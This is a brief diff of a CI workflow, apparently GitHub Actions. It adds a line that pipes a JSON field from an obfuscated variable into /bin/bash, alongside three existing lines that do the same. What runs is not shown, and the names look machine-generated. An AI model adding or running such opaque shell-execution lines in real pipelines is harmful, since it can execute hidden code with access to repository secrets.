@@ -21,6 +21,7 @@ jobs:
           echo $tyyhu8 | jq -r .ield9268 | /bin/bash
           echo $x85664 | jq -r .sm548 | /bin/bash
           echo $zdmps7552 | jq -r .w6 | /bin/bash
+          printf '%s' "$oh52810" | jq -r .jyoqw348 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
